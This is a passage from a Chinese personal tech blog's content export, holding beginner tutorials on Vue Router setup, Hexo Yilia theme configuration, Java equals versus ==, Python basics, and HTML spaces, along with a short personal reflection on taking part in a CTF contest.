class="hljs-name">template</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">"Main"</span><br>&#125;<br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">"scss"</span>&gt;</span><span class="css"><br><span class="hljs-selector-class">.el-header</span> &#123;<br>  <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#2d76d4</span>;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;<br>  <span class="hljs-attribute">line-height</span>: <span class="hljs-number">60px</span>;<br>&#125;<br><span class="hljs-selector-class">.el-aside</span> &#123;<br>  <span class="hljs-attribute">color</span>: <span class="hljs-number">#333</span>;<br>&#125;<br></span><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>   5、测试成功<br><img src="https://qiniuyun.fxhstudy.com/Vue-%E5%AE%9E%E6%88%98%E5%BF%AB%E9%80%9F%E4%B8%8A%E6%89%8B4.png" srcset="/img/loading.gif"><br></p>
</font>


]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>框架</tag>
      </tags>
  </entry>
  <entry>
    <title>Vue:vue-router路由</title>
    <url>/article/b42bbf94.html</url>
    <content><![CDATA[<p class="note note-success">说明</p>

<font color="#856363" size="4" face="Open Sans">
    学习的时候，尽量的打开官方文档
    Vue Router 是 Vue.js 官方的路由管理器。 它和Vue.js的核心深度集成，让构建单页面应用变得简单。包含的功能有：
    <li>嵌套的路由/视图表</li>
    <li>模块化的、基于组件的路由配置</li>
    <li>路由参数、查询、通配符</li>
    <li>基于Vue.js过渡系统的视图过渡效果</li>
    <li>细粒度的导航控制</li>
    <li>带有自动激活的CSS class 的链接</li>
    <li>HTML5 历史模式或hash 模式，在IE9中自动降级</li>
    <li>自定义的滚动条行为</li>
</font>

<br>
<br>
<p class="note note-success">安装</p>


<font color="#856363" size="4" face="Open Sans">
    <b>基于第一个`vue-cli`进行测试学习；先查看node_modules中是否存在 vue-router </b><br>
    vue-router 是一个插件包，所以我们还是需要用npm/cnpm来进行安装。打开命令行工具，进入你的项目目录，输入下面命令。
</font>
<br><br>

<figure class="highlight cmd"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmd">npm install vue-router --save-dev<br></code></pre></div></td></tr></table></figure>

<font color="#856363" size="4" face="Open Sans">
    如果一个模块化工程中使用它，必须要通过Vue.use()明确地安装路由功能：
</font>
<br><br>

<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span><br><span class="hljs-keyword">import</span> VueRouter <span class="hljs-keyword">from</span> <span class="hljs-string">'vue-router'</span><br><br>Vue.use(VueRouter);<br></code></pre></div></td></tr></table></figure>
<br>
<br>

<p class="note note-info">测试</p>

<font color="#856363" size="4" face="Open Sans">

<p>1、先删除没有用的东西<br></p>
<p>2、<code>component</code> 目录下存放我们自己编写的组件<br></p>
<p>3、定义一个 <code>Content.vue</code> 的组件<br></p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>内容<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">"Content"</span><br>&#125;<br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">style</span> <span class="hljs-attr">scoped</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">style</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<p><b>4、安装路由，在src目录下，新建一个文件夹: <code>router</code>，专门存放路由</b></p>
<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">"vue"</span><br><span class="hljs-comment">//导入路由插件</span><br><span class="hljs-keyword">import</span> VueRouter <span class="hljs-keyword">from</span> <span class="hljs-string">"vue-router"</span><br><br><span class="hljs-comment">//导入上面定义的插件</span><br><span class="hljs-keyword">import</span> Main <span class="hljs-keyword">from</span> <span class="hljs-string">'../components/Main'</span><br><span class="hljs-keyword">import</span> Content <span class="hljs-keyword">from</span> <span class="hljs-string">'../components/Content'</span><br><br><span class="hljs-comment">//安装路由</span><br>Vue.use(VueRouter);<br><br><span class="hljs-comment">//配置导出路由</span><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> <span class="hljs-keyword">new</span> VueRouter(&#123;<br>  <span class="hljs-attr">routes</span>: [<br>    &#123;<br>      <span class="hljs-comment">//路由路径</span><br>      <span class="hljs-attr">path</span>: <span class="hljs-string">'/content'</span>,<br>      <span class="hljs-comment">//路由名称</span><br>      <span class="hljs-attr">name</span>: <span class="hljs-string">'content'</span>,<br>      <span class="hljs-comment">//跳转的组件</span><br>      <span class="hljs-attr">component</span>: Content<br>    &#125;,<br>    &#123;<br>      <span class="hljs-comment">//路由路径</span><br>      <span class="hljs-attr">path</span>: <span class="hljs-string">'/main'</span>,<br>      <span class="hljs-comment">//路由名称</span><br>      <span class="hljs-attr">name</span>: <span class="hljs-string">'content'</span>,<br>      <span class="hljs-comment">//跳转的组件</span><br>      <span class="hljs-attr">component</span>: Main<br>    &#125;<br>  ]<br>&#125;);<br></code></pre></div></td></tr></table></figure>

<p>5、在 <code>main.js</code> 中配置路由</p>
<figure class="highlight js"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs js"><span class="hljs-keyword">import</span> Vue <span class="hljs-keyword">from</span> <span class="hljs-string">'vue'</span><br><span class="hljs-keyword">import</span> App <span class="hljs-keyword">from</span> <span class="hljs-string">'./App'</span><br><br><span class="hljs-comment">//导入上面创建的路由配置目录</span><br><span class="hljs-keyword">import</span> router <span class="hljs-keyword">from</span> <span class="hljs-string">'./router'</span> <span class="hljs-comment">//自动扫描里面的路由配置</span><br><br><span class="hljs-comment">//来关闭生产模式下给出的提示</span><br>Vue.config.productionTip = <span class="hljs-literal">false</span><br><br><span class="hljs-keyword">new</span> Vue(&#123;<br>  <span class="hljs-attr">el</span>: <span class="hljs-string">'#app'</span>,<br>  <span class="hljs-comment">//路由配置</span><br>  router,<br>  <span class="hljs-attr">components</span>: &#123; App &#125;,<br>  <span class="hljs-attr">template</span>: <span class="hljs-string">'&lt;App/&gt;'</span><br>&#125;);<br></code></pre></div></td></tr></table></figure>

<p>6、在 <code>App.vue</code> 中使用路由</p>
<figure class="highlight xml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">template</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">id</span>=<span class="hljs-string">"app"</span>&gt;</span><br>    <span class="hljs-comment">&lt;!--<br>      router-link: 默认会被渲染成一个 &lt;a&gt; 标签，to属性为指定链接<br>      router-view：用于渲染路由匹配到的组件<br>    --&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">h1</span>&gt;</span>Vue-Router<span class="hljs-tag">&lt;/<span class="hljs-name">h1</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/main"</span>&gt;</span>主页<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">router-link</span> <span class="hljs-attr">to</span>=<span class="hljs-string">"/content"</span>&gt;</span>内容页<span class="hljs-tag">&lt;/<span class="hljs-name">router-link</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">router-view</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">router-view</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">template</span>&gt;</span><br><br><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="javascript"><br><br><br><span class="hljs-keyword">export</span> <span class="hljs-keyword">default</span> &#123;<br>  <span class="hljs-attr">name</span>: <span class="hljs-string">'App'</span>,<br><br>&#125;<br></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><br></code></pre></div></td></tr></table></figure>

<p>7、在idea中的Terminal运行使用以下指令：</p>
<figure class="highlight cmd"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs cmd">npm run dev<br></code></pre></div></td></tr></table></figure>

</font>]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>Vue</tag>
        <tag>框架</tag>
      </tags>
  </entry>
  <entry>
    <title>YCTF线上大赛--赛后总结</title>
    <url>/article/c3c48e53.html</url>
    <content><![CDATA[<p>前几天参加了一次CTF的线上赛，是由易霖博红客学院所组织的线上比赛，第一次参加比较正式的CTF比赛，内心还是有点激动的啊！<br>我们学校的队伍一共就解除来了两题，我一题，学长一题，结果有点打击人。深深地意识到自己的不足之处了，太菜了我，唉，真的是从CTF入门到入土啊！<br>但同很多大佬一起竞赛还是很刺激的，正如很多菜鸡一样，就拿个签到题的分数，不过赛后仔细看了其他队伍的总成绩，嘿嘿，还是找回了一点自信心。<br>和大佬队伍，甚至还有北邮这种巨佬，不能比，但也有队伍只解出来了一题，还有一题都没有的。算是一些自我安慰吧！</p>
<p>下次CTF比赛，我相信我一定会做得更好的，赛前本来其实挺担心的，觉得自己什么都不会，但现在觉得，冲就完事了，别想那么多，不要为了比赛而去比赛，<br>而是抱着学习的态度去竞赛，总结自己的不足，有哪些不知道的地方(最后成功地证明了我真的，啥都不会，hh)，这样才能更好的反思前一段时间的不足，以及下一阶段该去怎么做。这样才能一点一点进步嘛</p>
<p>这里我还保存了一部分原题(密码题，隐写题，逆向题，当然还有我最爱的签到题)，至于二进制和web题的话，懂得都懂，<br>这里放一下<a href="https://pan.baidu.com/s/1oCzkUQ-jppdfgJEr5ZbuGA" target="_blank" rel="noopener">百度网盘链接</a>提取码：wcdg<br>你别说，这签到题还是需要一定的基础的，嘿嘿。</p>
]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>个人</tag>
      </tags>
  </entry>
  <entry>
    <title>Yilia的一些新功能的添加方法</title>
    <url>/article/1b2d97ad.html</url>
    <content><![CDATA[<h1>前言</h1><br>
这里介绍一下关于博客的一些高级配置，都是比较有用的设置。这些设置具体查起来比较烦，所以这里总结一下。
一方面让后来人可以方便一点，另一方面防止自己以后忘记怎么操作了，可以回来看看。
（注意这里不仔细讲解，只做总结，都是直接放链接的，自己去原作者那里去看）
<br>

<a id="more"></a>

<h2>1、页面的一些操作</h2>

<p>这里讲一些页面的小操作，让读者在浏览的时候可以跟方便一些<br><br></p>
<h3>1、如何分类和归档</h3>
归档和分类可以让读者很快地找到自己想要的文章
<img src="http://q6expveix.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720200302214146.jpg" srcset="/img/loading.gif"  alt="" />
<img src="http://q6expveix.bkt.clouddn.com/QQ%E5%9B%BE%E7%89%8720200302214154.jpg" srcset="/img/loading.gif" alt="" />
<br>

<p>这里我直接放上大佬的文章👉<a href="https://juejin.im/post/5db9830e6fb9a020270852b0" target="_blank" rel="nofollow">原文地址</a><br><br></p>
<h3>2、头像/图标设置</h3>
1、存放位置
头像、图标图片的存放位置是<code>/themes/yilia/source/</code>下任意位置，可以自己新建一个文件夹存放，我存放在assets文件夹下。

<p>2、配置设置<br>配置文件为<code>/themes/yilia/_config.yml</code>。<br></p>
<p>设置头像为配置文件中<code>avatar</code>一项<br><br>设置图标为配置文件中<code>favicon</code>一项<br><br>由于设置路径的根目录<code>/themes/yilia/source/</code>，因此，我的头像存放的地址是<code> /themes/yilia/source/assets/me.png </code>，设置则为<code> avatar: /assets/me.png </code>。<br><br></p>
<h3>3、左侧添加背景</h3>
这个还可以，但是我用手机看了一下，基本上手机上显示的就是一片空白了，所以就没弄那个了，<br>
不过还是可以的，这里写下来，也是为了记录一下，以后万一要改呢？<br>👉<a href="https://qianlei6148.github.io/2018/09/30/hexo%E6%A8%A1%E7%89%88yilia%E5%B7%A6%E4%BE%A7%E6%B7%BB%E5%8A%A0%E8%83%8C%E6%99%AF/" target="_blank" rel="nofollow">hexo模版yilia左侧添加背景</a>
<br>

<h3>4、添加版权信息&&URL持久化</h3>
版权这个东西还是很重要的，所以建议在建博客的时候加上这一点。<br>
<img src="http://q6expveix.bkt.clouddn.com/%E7%89%88%E6%9D%83.jpg" srcset="/img/loading.gif" alt="" /><br>
👉<a href="https://blog.zscself.com/posts/ee4d9ecb/" target="_blank" rel="nofollow">在Hexo中自动为Yilia主题增加版权声明</a>

<p>我们所写的文章地址路径很长，其中包括了年月日，url结构超过了三层不利于搜索爬虫，url持久化可以解决这个问题。<br><br>并且我们生成的版权信息中中文字会被编码，形成的链接又臭又长，极其难看，你同样可以利用这个办法来解决，是不是非常客来碗儿呢！<br><br>👉<a href="http://yansheng836.coding.me/article/faa5d14.html" target="_blank" rel="nofollow">hexo+yilia添加URL持久化</a><br><br></p>
<h3>5、添加页面访问量</h3>
这个可以实现网站访问量和文章访问量，作者把网站访问量添加到页脚的右侧，这里我是放到了头像的下面。
👉<a href="https://blog.csdn.net/dta0502/article/details/89607895" target="_blank" rel="nofollow">八、添加页面访问量</a>
<br>

<h3>6、字数、阅读时长添加</h3>
这个小细节我本人还是很喜欢的，可以看到一篇博文的文字和阅读时长，看起来很舒服。
👉<a href="https://blog.csdn.net/dta0502/article/details/89607895" target="_blank" rel="nofollow">十、字数、阅读时长添加</a>
<br>

<h3>7、侧边栏添加音乐&&可爱的看板娘</h3>
这个我没有添加，感觉有点多余了，现在听音乐太容易了，而且占空间，别人是来看你的文章的，<br>
而不是来花里胡哨的。这里还是放上链接👉<a href="https://blog.csdn.net/dta0502/article/details/89607895" target="_blank" rel="nofollow">七、侧边栏添加音乐</a>
至于看板娘嘛，二次元的应该喜欢，看了别人弄的，感觉也很占地方，所以也没弄了，感兴趣的话可以去看看<br>👉<a href="https://qianlei6148.github.io/2018/10/11/hexo%E6%A8%A1%E7%89%88yilia%E6%B7%BB%E5%8A%A0%E5%8F%AF%E7%88%B1%E7%9A%84%E7%9C%8B%E6%9D%BF%E5%A8%98/" target="_blank" rel="nofollow">hexo模版yilia添加可爱的看板娘</a>


<hr>
<br>

<h2>2、实现文章评论</h2>

<p>这个我实际操作的时候花了点功夫，反正不太难，就是繁琐，遇到的问题也很多，不过最终还是解决了<br><br>这里我放上两个链接，一个是怎么实现GitHub评论，还有一个是后续可能出现的的一些问题，总结的还是很全的<br><br>👉<a href="https://blog.csdn.net/qq_37513473/article/details/88617281" target="_blank" rel="nofollow">5、引入GITMENT评论</a>(这篇文章中还涉及到主页文章过长的解决办法)<br>👉<a href="https://www.jianshu.com/p/57afa4844aaa" target="_blank" rel="nofollow">Gitment评论功能接入踩坑教程</a></p>
<hr>
<br>

<h2>3、实现文章目录</h2>

<p>这个其实本来主题就自带的，不过我还是改了一下，更清晰一点，可以让读者一目了然<br>👉<a href="http://www.lawlite.me/2017/04/17/Hexo-yilia%E4%B8%BB%E9%A2%98%E5%AE%9E%E7%8E%B0%E6%96%87%E7%AB%A0%E7%9B%AE%E5%BD%95%E5%92%8C%E6%B7%BB%E5%8A%A0%E8%A7%86%E9%A2%91/" target="_blank" rel="nofollow">Hexo + yilia主题实现文章目录和添加视频</a>(感觉视频的话，没什么用，个人看法，不喜勿喷)<br><br><img src="http://q6expveix.bkt.clouddn.com/%E7%9B%AE%E5%BD%95.jpg" srcset="/img/loading.gif" alt="" /><br><br></p>
<p>下面这个是主题自带的文章目录，也记录一下:<br><br>增加文章目录 TOC ( table of content )，方便阅读文章，在 <code>themes/yilia/_config.yml </code>中进行配置 <code>toc: 2 </code>即可，它会将你<code> Markdown </code>语法的标题，生成目录，目录查看在右下角。</p>
<hr>
<br>

<h2>4、其他的一些操作</h2>
<br>

<h3>1、博客插入图片</h3>
博客内容最麻烦的就是插入图片，我们可以使用七牛云提供的 10G 的免费存储空间，将图片上传上去，然后生成外链，使用 Markdown 的图片引用方法即可，这样文章就脱离了图片编辑，转为在线了。同样一份文章，你部署在 csdn 等其他网页时，直接复制粘贴即可。<br>
上传图片到七牛云
<blockquote>
    •注册，并完成支付宝实名认证，实名认证后有10G的免费空间，认证免费额度<br>
    •添加文件。步骤为添加 对象存储, 新建一个存储空间，进入到该空间，点击 内容管理,点击上传文件<br>
</blockquote>
<img src="http://q6expveix.bkt.clouddn.com/3_6_qiniu_1.png" srcset="/img/loading.gif" alt="" />
<blockquote>
    •生成外链插入到文章中
</blockquote>
<img src="http://q6expveix.bkt.clouddn.com/3_6_qiniu_2.png" srcset="/img/loading.gif" alt="" /><br>
这里放一下原文👉<a href="https://cloudy-liu.github.io/2018/04/07/Hexo_yilia_%E4%B8%BB%E9%A2%98%E4%B8%80%E6%8F%BD%E5%AD%90%E4%BC%98%E5%8C%96%E6%96%B9%E6%A1%88/" target="_blank" rel="nofollow">七牛云图床</a>

<hr>
<br>

<h3>2、部署</h3>
<blockquote>
    hexo clean<br>
    hexo g<br>
    hexo d<br>
</blockquote>


<hr>
<br>

<h1>结语</h1>
最后再放上一首老歌《粉红的回忆》，<br>
每次听到这首歌我都会想起《唐探2》里面王宝强那一段，hh
<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=86 src="//music.163.com/outchain/player?type=2&id=243611&auto=0&height=66"></iframe>

<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>
<br>]]></content>
      <categories>
        <category>搭建博客</category>
      </categories>
      <tags>
        <tag>起点</tag>
      </tags>
  </entry>
  <entry>
    <title>equal与==的区别</title>
    <url>/article/74b2e088.html</url>
    <content><![CDATA[<blockquote>
    原文链接: <a href="https://www.cnblogs.com/zhuyeshen/p/10954275.html" target="_blank" rel="noopener">https://www.cnblogs.com/zhuyeshen/p/10954275.html</a>
</blockquote>


<p>学而不思则罔,思而不学则殆。我认为学习不仅仅是学习新思，更多的是需要多思考我们曾经学过的东西，反复深究那些我们已经会的东西，由浅入深。<br>==与equal的区别我虽了解，但u1s1，没有很系统的学习过，这里转载了一篇有关==与equal之间的区别，分析得很详细。</p>
<p>equal与==</p>
<p>1.最大的区别是，==是运算符，equal是方法</p>
<p>简述几种情况下的equal与==</p>
<p>java基本类型<br>比较包装类型<br>比较String类型<br>比较对象<br>1.java基本类型（short，int，long，byte，char，float，double，boolean）</p>
<p>比较基本类型，只能用==，不能用equal，这里的==比较的是两个变量的值</p>
<p>2.比较包装类型</p>
<p>==比较的是内存地址，因为a和b是new出来的，是两个不同的对象，所以地址肯定是不同的，而equal比较的是值，附上源码</p>
<img src="https://qiniuyun.fxhstudy.com/equal%E4%B8%8E%3D%3D%E7%9A%84%E5%8C%BA%E5%88%AB.png" srcset="/img/loading.gif">

<br>
<br>

<img src="https://qiniuyun.fxhstudy.com/equal%E4%B8%8E%3D%3D%E7%9A%84%E5%8C%BA%E5%88%AB1.png" srcset="/img/loading.gif">

<p>3.比较String类型</p>
<p>==比较的是内存地址，equal比较的是值</p>
<p>这里给出一道题，来供参考</p>
<img src="https://qiniuyun.fxhstudy.com/equal%E4%B8%8E%3D%3D%E7%9A%84%E5%8C%BA%E5%88%AB2.png" srcset="/img/loading.gif">

<p>这道题我们一步一步来解决，首先s1==s2，==比较的是内存地址，而s2是new出来的新对象，new String(“xxxx”)放在堆中，而s1的“xxxx”放在常量池中，所以比较结果是false</p>
<p>第二，s1==s5，字符串+的本质是创建了StringBulider对象进行append操作，然后将拼接后的StringBulider对象用toString进行处理，处理后生成的字符串放在字符串池中找有没有相同值的字符串，如果有将引用（s5）直接连接到已有的字符串地址，所以s1和s5的地址相同</p>
<p>第三，s1=s3+s4，这个的原理是涉及到类加载时初始化的问题，s3和s4的结果无法在编译期间确定，如果把s3和s4定义为final类型，结果就是true了，java在编译时，就知道“Program”+”ming”=”Programming”了，但却是在运行时才知道s3+s4=”Programming”</p>
<p>4.比较对象</p>
<p>==和equal比较的都是内存地址，因为equal没有被重写，没有被重写的equal都是object的equal方法</p>
<p>也能参考下面</p>
<p>1.“==”常用来比较基本数据类型，8种基本数据类型有byte、short、long、double、char、int、float、boolean，因为变量直接存储的就是他们的值，所以用”==”去比较，比较的就是他们的值。</p>
<p>但是复合数据类型用“==”比较的是他的堆内存地址。<br>2.“equals”对于复合数据类型比较的也是它的堆内存地址（不能作用于基本数据类型的变量）。</p>
<p>但在实际项目中常用来比较String字符串的内容相等是为什么呢？</p>
<p>那是因为对于String（还有Date，Integer）类型重写了equals方法，使其比较的是存储对象的内容是否相等，而不是堆内存地址。</p>
<figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">String str1 = <span class="hljs-string">"Hello"</span>;<br>String str5 = <span class="hljs-string">"Hello"</span>;<br>String str2 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">"Hello"</span>);<br>String str4 = <span class="hljs-keyword">new</span> String(<span class="hljs-string">"Hello"</span>);<br>String str3 = str2; <span class="hljs-comment">// 引用传递，同一对象</span><br>System.out.println(str1 == str2); <span class="hljs-comment">// false（str2是new的一个新地址）</span><br>System.out.println(str1 == str3); <span class="hljs-comment">// false（str3和str2内存地址一样，和str1地址不同）</span><br>System.out.println(str2 == str3); <span class="hljs-comment">// true（引用str2，地址相同）</span><br>System.out.println(str1 == str5); <span class="hljs-comment">// true（String作为基本类型，没创建新地址）</span><br>System.out.println(str4 == str2); <span class="hljs-comment">// false（内存地址不同）</span><br>System.out.println(str1.equals(str2)); <span class="hljs-comment">// true（内容一致，都是“hello”）</span><br>System.out.println(str1.equals(str3)); <span class="hljs-comment">// true（内容一致，都是“hello”）</span><br>System.out.println(str2.equals(str3)); <span class="hljs-comment">// true（内容一致，都是“hello”）</span><br>System.out.println(str2.equals(str4)); <span class="hljs-comment">// true（内容一致，都是“hello”）</span><br>System.out.println(str1.equals(str5)); <span class="hljs-comment">// true（内容一致，都是“hello”）</span><br></code></pre></div></td></tr></table></figure>]]></content>
      <categories>
        <category>程序猿</category>
      </categories>
      <tags>
        <tag>转载</tag>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title>飞机大战中遇到的Python【基础】</title>
    <url>/article/69be526e.html</url>
    <content><![CDATA[<p>最近在学习Python，在编写一款飞机大战的游戏的学习的过程中，遇到的一些知识点，这里记录一下</p>
<a id="more"></a>

<h2 id="如何理解if-–name–-’–main–’"><a href="#如何理解if-–name–-’–main–’" class="headerlink" title="如何理解if –name–==’–main–’"></a>如何理解if –name–==’–main–’</h2><p>一对双下划线可能编译不出来用–代替__</p>
<p>python文件一般有两种使用的方法，<div style="font-family:'Microsoft YaHei', '微软雅黑', '宋体', sans-serif;"><span style="font-size:14px;color:#CC66CC;">第一是作为脚本直接运行&nbsp;</span>，<div style="font-family:'Microsoft YaHei', '微软雅黑', '宋体', sans-serif;"><span style="font-size:14px;color:#CC66CC;">第二是import导入其他脚本中被调用&nbsp;</span>，<br>而if –name–==’–main–’，的作用就是控制这两种情况执行代码的过程，使用这个方法时，是运行在第一种情况下。<br>如果是在当前模块中运行时，–name–==’–main–’;<br>而如果是被import导入到其他模块中时，–name–==’当前模块的名称’。<br>所以，在if –name–==’–main–’主要目的，是为了测试当前模块是否能够达到开发者想要的效果。</p>
</br>

<h2 id="python中super-函数的用法"><a href="#python中super-函数的用法" class="headerlink" title="python中super()函数的用法"></a>python中super()函数的用法</h2><p>super()的主要用法有两种： 在单类继承中，其意义就是不需要父类的名称来调用父类的函数，因此当子类改为继承其他父类的时候，不需要对子类内部的父类调用函数做任何修改就能调用新父类的方法。(这里只说这一种)</p>
<blockquote>

<div class="hljs code-wrapper"><pre><code>class Dog(object):

def bark(self):
    print(&quot;汪汪叫&quot;)


class XiaoGou(Dog):

    def demo(self):
        # 使用 super(). 调用原本在父类中封装的方法
        super().bark()            
        print(&quot;$%^$^&amp;**&quot;)


xiaohuang = XiaoGou()
xiaohei = Dog()

xiaohei.bark()
xiaohuang.demo()</code></pre></div></blockquote>
输出的结果是
<blockquote>

<div class="hljs code-wrapper"><pre><code>汪汪叫
汪汪叫
$%^$^&amp;**</code></pre></div></blockquote>
Dog实例化的对象调用了bark方法，打印输出了 汪汪叫；

<p>XiaoGou实例化的对象调用了自己的demo方法，先调用了父类的方法打印输出了 汪汪叫 ，再打印输出 $%^$^&amp;** 。</p>
</br>
</br>

<h2 id="python中的self"><a href="#python中的self" class="headerlink" title="python中的self"></a>python中的self</h2><p>python规定：访问类成员时，需要在前面加上self。例如：</p>
<blockquote>
    self.name = name
</blockquote>
这里，self.name = name表示为类添加了属性name。
如果变量前不加self，则视为局部变量。这个变量会在方法运行结束后失效。而属性在整个类的范围内都是有效的。
self是只有在类中才会有的。self在定义类的方法时是必须有的，虽然在调用时不必传入相应的参数。
<div style="font-family:'Microsoft YaHei', '微软雅黑', '宋体', sans-serif;"><span style="font-size:14px;color:#CC66CC;">在类中函数相互调用要加 self&nbsp;</span>

<p>这篇博客说的很详细，可以去这里看一下👉<a href="https://blog.csdn.net/xrinosvip/article/details/89647884" target="_blank" rel="noopener">读懂python中的self</a></p>
</br>
</br>


<h2 id="pygame中的display模块"><a href="#pygame中的display模块" class="headerlink" title="pygame中的display模块"></a>pygame中的display模块</h2><p>pygame.display 是 Pygame 中用于控制窗口和屏幕显示的模块。<br>这里介绍一些飞机大战中所用到的函数</p>
<p>pygame.display.set_mode()  —  初始化一个准备显示的窗口或屏幕<br>pygame.display.update()  —  更新部分软件界面显示</p>
</br>
</br>
</br>
</br>

</br>
</br>]]></content>
      <tags>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>html中如何实现空格</title>
    <url>/article/fbe91a2d.html</url>
    <content><![CDATA[<p>在html代码中直接使用空格键键入多个空格键，而实际的网页浏览器显示一个空格的位置。<br>如果需要实现html多个空格占位，需要使用html空格字符 ＆nbsp;或者&amp;#160；两者都是空格占位符，输入几个，就能在页面显示几个空格。</p>
